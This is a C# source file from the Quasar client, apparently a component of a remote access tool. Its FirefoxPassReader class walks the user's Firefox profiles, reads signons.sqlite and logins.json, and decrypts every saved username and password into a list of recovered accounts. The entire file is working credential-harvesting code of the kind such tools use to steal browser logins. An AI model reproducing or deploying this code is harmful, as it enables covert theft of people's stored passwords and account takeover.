using Quasar.Client.Recovery.Utilities;
using Quasar.Common;
using System;
using System.Collections.Generic;
using System.IO;
using Newtonsoft.Json;

namespace Quasar.Client.Recovery.Browsers
{
    public class FirefoxPassReader : IAccountReader
    {
        /// <inheritdoc />
        public string ApplicationName => "Firefox";

        /// <inheritdoc />
        public IEnumerable<RecoveredAccount> ReadAccounts()
        {
            string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));

            var logins = new List<RecoveredAccount>();
            if (dirs.Length == 0)
                return logins;

            foreach (string dir in dirs)
            {
                string signonsFile = string.Empty;
                string loginsFile = string.Empty;
                bool signonsFound = false;
                bool loginsFound = false;

                string[] files = Directory.GetFiles(dir, "signons.sqlite");
                if (files.Length > 0)
                {
                    signonsFile = files[0];
                    signonsFound = true;
                }

                files = Directory.GetFiles(dir, "logins.json");
                if (files.Length > 0)
                {
                    loginsFile = files[0];
                    loginsFound = true;
                }

                if (loginsFound || signonsFound)
                {
                    using (var decrypter = new FFDecryptor())
                    {
                        var r = decrypter.Init(dir);
                        if (signonsFound)
                        {
                            SQLiteHandler sqlDatabase;

                            if (!File.Exists(signonsFile))
                                return logins;

                            try
                            {
                                sqlDatabase = new SQLiteHandler(signonsFile);
                            }
                            catch (Exception)
                            {
                                return logins;
                            }


                            if (!sqlDatabase.ReadTable("moz_logins"))
                                return logins;

                            for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                            {
                                try
                                {
                                    var host = sqlDatabase.GetValue(i, "hostname");
                                    var user = decrypter.Decrypt(sqlDatabase.GetValue(i, "encryptedUsername"));
                                    var pass = decrypter.Decrypt(sqlDatabase.GetValue(i, "encryptedPassword"));

                                    if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user))
                                    {
                                        logins.Add(new RecoveredAccount
                                        {
                                            Url = host,
                                            Username = user,
                                            Password = pass,
                                            Application = ApplicationName
                                        });
                                    }
                                }
                                catch (Exception)
                                {
                                    // ignore invalid entry
                                }
                            }
                        }

                        if (loginsFound)
                        {
                            FFLogins ffLoginData;
                            using (var sr = File.OpenRead(loginsFile))
                            {
                                ffLoginData = JsonConvert.DeserializeObject<FFLogins>(sr.ReadToEnd().GetString());
                            }

                            foreach (Login loginData in ffLoginData.Logins)
                            {
                                string username = decrypter.Decrypt(loginData.EncryptedUsername);
                                string password = decrypter.Decrypt(loginData.EncryptedPassword);
                                logins.Add(new RecoveredAccount
                                {
                                    Username = username,
                                    Password = password,
                                    Url = loginData.Hostname.ToString(),
                                    Application = ApplicationName
                                });
                            }
                        }
                    }
                }

            }

            return logins;
        }

        private class FFLogins
        {
            [JsonProperty("nextId")]
            public long NextId { get; set; }

            [JsonProperty("logins")]
            public Login[] Logins { get; set; }

            [JsonIgnore]
            [JsonProperty("potentiallyVulnerablePasswords")]
            public object[] PotentiallyVulnerablePasswords { get; set; }

            [JsonIgnore]
            [JsonProperty("dismissedBreachAlertsByLoginGUID")]
            public DismissedBreachAlertsByLoginGuid DismissedBreachAlertsByLoginGuid { get; set; }

            [JsonProperty("version")]
            public long Version { get; set; }
        }
        private class DismissedBreachAlertsByLoginGuid
        {
        }

        private class Login
        {
            [JsonProperty("id")]
            public long Id { get; set; }

            [JsonProperty("hostname")]
            public Uri Hostname { get; set; }

            [JsonProperty("httpRealm")]
            public object HttpRealm { get; set; }

            [JsonProperty("formSubmitURL")]
            public Uri FormSubmitUrl { get; set; }

            [JsonProperty("usernameField")]
            public string UsernameField { get; set; }

            [JsonProperty("passwordField")]
            public string PasswordField { get; set; }

            [JsonProperty("encryptedUsername")]
            public string EncryptedUsername { get; set; }

            [JsonProperty("encryptedPassword")]
            public string EncryptedPassword { get; set; }

            [JsonProperty("guid")]
            public string Guid { get; set; }

            [JsonProperty("encType")]
            public long EncType { get; set; }

            [JsonProperty("timeCreated")]
            public long TimeCreated { get; set; }

            [JsonProperty("timeLastUsed")]
            public long TimeLastUsed { get; set; }

            [JsonProperty("timePasswordChanged")]
            public long TimePasswordChanged { get; set; }

            [JsonProperty("timesUsed")]
            public long TimesUsed { get; set; }
        }
    }
}
